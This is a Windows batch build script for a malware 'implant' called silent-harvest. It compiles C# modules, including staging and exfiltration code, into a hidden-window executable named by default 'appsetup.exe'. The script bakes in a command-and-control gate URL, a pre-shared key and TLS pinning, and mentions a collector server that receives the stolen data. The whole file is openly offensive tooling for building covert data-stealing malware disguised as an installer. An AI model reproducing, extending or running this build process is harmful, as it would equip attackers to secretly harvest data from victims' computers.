@echo off
rem ============================================================
rem  silent-harvest implant build (in-box csc.exe, no toolchain)
rem
rem  usage: build.bat [/name app.exe] [/c2 http://host:8443/gate]
rem                    [/psk SECRET] [/pin cert:HEX] [/release-only]
rem
rem  /psk omitted  -> a strong random PSK is generated per build and
rem                   written to server\psk.txt (collector reads it).
rem                   The console shows only a fingerprint, never the PSK.
rem  /pin          -> TLS mode baked into the binary:
rem                     (omitted)       verify against system CAs
rem                     cert:HEX        pin the exact server cert sha256
rem                     any             accept any cert (DEBUG ONLY)
rem
rem  builds:
rem    build\sh_debug.exe    console build with stage logging
rem    build\<name>          GUI build (no console), default appsetup.exe
rem ============================================================
setlocal enabledelayedexpansion
set CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
if not exist "%CSC%" set CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe
if not exist "%CSC%" (
    echo [ERR] no in-box csc.exe found & exit /b 1
)

set NAME=appsetup.exe
set C2=http://127.0.0.1:8443/gate
set PSK=
set PIN=
set AUTH=
set RELEASEONLY=0

:parse
if "%~1"=="" goto done
rem accept -flag and /flag (git-bash mangles /flags into paths)

set SHARG=%~1

if "%SHARG:~0,1%"=="-" set SHARG=/%SHARG:~1%

if /i "%SHARG:~0,5%"=="/name"   ( set NAME=%~2& shift& shift& goto parse )

if /i "%SHARG:~0,3%"=="/c2"     ( set C2=%~2& shift& shift& goto parse )

if /i "%SHARG:~0,4%"=="/psk"    ( set PSK=%~2& shift& shift& goto parse )

if /i "%SHARG:~0,4%"=="/pin"    ( set PIN=%~2& shift& shift& goto parse )

if /i "%SHARG:~0,5%"=="/auth"   ( set AUTH=%~2& shift& shift& goto parse )

if /i "%~1"=="/release-only" ( set RELEASEONLY=1& shift& goto parse )
echo [WARN] unknown arg %1 & exit /b 1
:done

if not exist build mkdir build

rem --- generate a strong random PSK when none supplied ---
set GENPSK=0
if "%PSK%"=="" (
    for /f "delims=" %%G in ('powershell -NoProfile -Command "[guid]::NewGuid().ToString('N')+[guid]::NewGuid().ToString('N')"') do set PSK=%%G%%G
    set GENPSK=1
    echo [OK] generated random per-build PSK ^(128 hex chars^)
)

if "%SH_NOGEN%"=="1" goto skipgen
set OUTDIR=%~dp0.
set GENFLAG=
if "%GENPSK%"=="1" set GENFLAG=-WritePskFile
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tools\genconfig.ps1" -Psk "%PSK%" -C2 "%C2%" -Pin "%PIN%" -Auth "%AUTH%" -OutDir "%OUTDIR%" %GENFLAG% > "%TEMP%\sh_pskfp.txt" 2>&1
for /f "tokens=2 delims==" %%F in (%TEMP%\sh_pskfp.txt) do set PSKFP=%%F

echo [*] C2        = %C2%
echo [*] TLS pin   = %PIN%
if "%PIN%"=="" echo [WARN] TLS: verifying against system CAs -- self-signed collectors need /pin cert:HEX
if /i "%PIN%"=="any" echo [WARN] TLS: AcceptAnyCert mode -- no MITM protection, debug only
if not defined PSKFP ( echo [ERR] config generation failed & exit /b 1 )
:skipgen
echo [*] PSK fp    = %PSKFP%
echo [*] collector = reads server\psk.txt ^(gitignored; treat as secret^)

set SRCS=implant\Native.cs implant\Util.cs implant\Crypto.cs implant\Stages.cs implant\Exfil.cs implant\Program.cs implant\Config.cs

if %RELEASEONLY%==0 (
    echo [*] building console/debug build...
    "%CSC%" /nologo /target:exe /optimize+ /define:DEBUG_LOG /r:System.Drawing.dll /r:System.Web.Extensions.dll /r:System.Windows.Forms.dll /out:build\sh_debug.exe %SRCS%
    if errorlevel 1 exit /b 1
)

echo [*] building release (GUI) build: build\%NAME%
"%CSC%" /nologo /target:winexe /optimize+ /r:System.Drawing.dll /r:System.Web.Extensions.dll /r:System.Windows.Forms.dll /out:build\%NAME% %SRCS%
if errorlevel 1 exit /b 1

echo [+] done.
endlocal
